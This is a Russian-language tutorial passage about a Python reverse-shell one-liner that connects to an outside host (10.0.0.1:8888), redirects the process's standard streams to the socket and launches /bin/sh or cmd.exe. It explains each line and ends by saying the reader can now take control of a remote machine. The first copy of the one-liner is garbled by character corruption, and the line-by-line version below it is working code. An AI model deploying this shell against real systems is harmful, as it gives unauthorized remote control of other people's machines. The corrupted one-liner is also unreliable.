Шелл обной строчкой

Чтобы закинуть код на удаленную машину, удобно иметь его в виде одной строки. 
Благо Python есть все необходимое, чтобы уместить код клиента в одну
недлинню строку. от как она выглядит:

python -с 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAМ);
s . connect ( ( "1 О. О. О . 1", 8 8 8 8) ) ; os. dup2 ( s. f i leno () , О) ; os. dup2 ( s. f i leno ( ) , 1) ;
os. dup2 (s. fileno (), 2) ;p=subprocess. call ( [ "/Ьin/sh", "-i"]);'

Ключ -с позволяет передать программу в качестве параметра.

Думаю, ты сразу подметил знкомые элементы кода. Но для удобства я распишу построчно:

import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.0.0.1', 8888))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh', '-i']) # Для Windows -.call('cmd.exe')

Как видишь, появилось кое-что новенькое: os, dup2(), fileno(). Чтобы понять, как
это работает, нужно знать, что такое файловые дескрипторы.

Если совсем по-простому, то это некие целые неотрицательные числа, которые возвращаются
процессу после того, как он создаст поток ввода-вывода и поток диагностики. 
В UNIX устоявшиеся названия потоков - это 0, 1, 2.0 соответствует стандартному
вводу процесса (терминал), 1 - стандартный вывод (терминал),
2 - поток диагностики (файл с сообщениями об ошибках).

Модуль os - это еще один стандартный элемент Python. Он позволяет программе общаться
с операционной системой. Входящий в него метод dup2() предназначен для того, чтобы 
менять значения файловых дескрипторов. fileno() - это метод объекта типа socket,
который возвращает файловый дескриптор сокета. А при помощи метода dup2() мы меняем
дескрипторы ввода-вывода и ошибок не соответствующие дескрипторы сокета.

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

То есть считай, мы взяли и сделали наш сокет полноценным процессом. Что это нам дает?
Мы можем запустить терминал и использовать его! Для этого нужна вот эта строка:

p = subprocess.call(['/bin/sh','-i'])

Для Windows она будет слегка другой:
p = subprocess.call('cmd.exe')

Вот так вот мы "обхитрили" систему. Точнее, просто воспользовались одной из
продвинутых функций.

В завершение

Теперь ты не только знаешь, как организовать передачу сообщений между программами
на Python, но и умеешь писать хитрые однострочники, которые передают тебе
управление удаленной машиной. Думаю, ты уже ощущаешь невероятную мощь и готов
к экспериментам.